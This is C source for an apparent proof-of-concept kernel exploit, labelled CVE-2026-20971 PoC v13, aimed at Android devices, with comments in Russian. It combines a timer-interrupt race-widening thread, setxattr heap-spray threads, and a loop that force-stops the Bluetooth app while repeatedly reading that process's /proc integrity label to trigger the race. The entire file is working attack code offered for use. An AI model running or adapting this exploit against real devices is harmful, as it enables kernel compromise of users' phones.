#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <string.h>
#include <signal.h>
#include <dirent.h>
#include <sys/xattr.h>
#include <pthread.h>
#include <errno.h>
#include <sys/time.h>
#include <sched.h>

// --- ExpRace: Обработчик прерываний ---
void sigalrm_handler(int sig) {
    // Мы не делаем ничего, но сам факт прерывания ядра
    // растягивает окно гонки.
}

void* interrupter_thread(void* arg) {
    // Привязываемся к CPU 0 (туда же, куда и читатель)
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    sched_setaffinity(0, sizeof(set), &set);

    // Настраиваем таймер на 30 микросекунд
    struct sigaction sa;
    sa.sa_handler = sigalrm_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sigaction(SIGALRM, &sa, NULL);

    struct itimerval timer;
    timer.it_value.tv_sec = 0;
    timer.it_value.tv_usec = 30; // 30 мкс
    timer.it_interval.tv_sec = 0;
    timer.it_interval.tv_usec = 30;
    setitimer(ITIMER_REAL, &timer, NULL);

    while(1) {
        pause(); // Ждем сигнала
    }
    return NULL;
}

int find_pid(const char *name) {
    DIR *dir = opendir("/proc");
    struct dirent *entry;
    int pid = -1;
    if (!dir) return -1;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            int id = atoi(entry->d_name);
            if (id > 0) {
                char path[256], cmdline[128];
                snprintf(path, sizeof(path), "/proc/%d/cmdline", id);
                int fd = open(path, O_RDONLY);
                if (fd >= 0) {
                    int n = read(fd, cmdline, sizeof(cmdline)-1);
                    close(fd);
                    if (n > 0) {
                        cmdline[n] = '\0';
                        if (strstr(cmdline, name) != NULL) {
                            pid = id;
                            break;
                        }
                    }
                }
            }
        }
    }
    closedir(dir);
    return pid;
}

void* spray_thread(void* arg) {
    char value[56]; 
    memset(value, 0xFF, sizeof(value)); 
    char path[64];
    snprintf(path, sizeof(path), "/data/local/tmp/spray_%d", gettid());
    int fd = open(path, O_CREAT | O_RDWR, 0600);
    if (fd >= 0) close(fd);
    long count = 0;
    while(1) {
        char name[64];
        snprintf(name, sizeof(name), "user.spray_%ld", count++);
        setxattr(path, name, value, sizeof(value), 0);
    }
    return NULL;
}

void* killer_thread(void* arg) {
    while(1) {
        // Убиваем Bluetooth. 10 мс задержки, чтобы system_server не упал.
        system("am force-stop com.android.bluetooth > /dev/null 2>&1");
        usleep(10000); 
    }
    return NULL;
}

int main() {
    setbuf(stdout, NULL);
    printf("[*] CVE-2026-20971 PoC v13 (ExpRace)\n");

    // 1. Запускаем поток прерываний (ExpRace)
    pthread_t int_tid;
    pthread_create(&int_tid, NULL, interrupter_thread, NULL);
    pthread_detach(int_tid);

    // 2. Запускаем 4 потока спрея
    for (int i=0; i<4; i++) {
        pthread_t tid;
        pthread_create(&tid, NULL, spray_thread, NULL);
        pthread_detach(tid);
    }

    // 3. Запускаем поток-убийцу
    pthread_t killer_tid;
    pthread_create(&killer_tid, NULL, killer_thread, NULL);
    pthread_detach(killer_tid);

    // 4. Главный поток (читатель) привязываем к CPU 0
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    sched_setaffinity(0, sizeof(set), &set);

    char buf[256];
    long iterations = 0;
    int pid = -1;

    while (1) {
        if (pid == -1 || kill(pid, 0) != 0) {
            pid = find_pid("com.android.bluetooth");
            if (pid == -1) {
                usleep(1000); 
                continue;
            }
            printf("[+] Found PID: %d\n", pid);
        }

        char path[64];
        snprintf(path, sizeof(path), "/proc/%d/integrity/label", pid);

        int fd = open(path, O_RDONLY);
        if (fd >= 0) {
            // read() может быть прерван сигналом SIGALRM (EINTR)
            // Это нормально, мы просто пытаемся снова.
            ssize_t n = read(fd, buf, sizeof(buf)); 
            close(fd);
        }
        
        iterations++;
        if (iterations % 50000 == 0) {
            printf("[*] Iterations: %ld\n", iterations);
        }
    }
    return 0;
}